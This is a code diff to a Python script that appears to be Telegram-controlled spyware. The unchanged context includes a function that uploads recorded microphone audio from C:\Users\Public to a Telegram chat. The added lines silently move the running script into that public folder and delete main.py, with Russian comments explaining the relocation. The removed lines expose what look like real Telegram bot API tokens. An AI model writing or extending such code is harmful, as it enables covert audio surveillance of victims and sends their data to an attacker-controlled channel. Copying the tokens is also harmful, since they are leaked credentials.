@@ -49,7 +49,23 @@ import wavio as wv
 from multiprocessing import Process
 
 
-#6619437777:AAGAmak2lcgXlaJc1KniqJrpT2sjlSwXpIg
+
+# Перемешени файла при запуске в папку C:\\Users\\Public
+try:
+    script_path = os.path.abspath(__file__)
+    config_path = os.path.join(os.path.dirname(script_path), 'main.py')
+
+
+    if not os.path.exists(config_path) or not open(config_path, 'r', encoding='utf-8').read().strip() == 'oved=true':
+            script_path = os.path.abspath(__file__)
+            # Куда он будет сохраняться 
+            target_path = os.path.join('C:\\Users\\Public', os.path.basename(script_path))
+            shutil.move(script_path, target_path)
+            
+            os. remove('main.py')
+except:
+    print('None')
+
 
 def send_audio(bot, chat_id):
     with open(r"C:\Users\Public\recorded.wav", "rb") as f:
@@ -76,7 +92,7 @@ auto = ''
 
 # API
 ##########################################################
-bot = telebot.TeleBot('6038725147:AAH0MLqKaSgJdgXPhQvhDLSdLd0XW2PSD5M')
+bot = telebot.TeleBot('YOUR_API_TELEGRAM_TOKEN')
 ##########################################################
 
 username = os.getlogin()
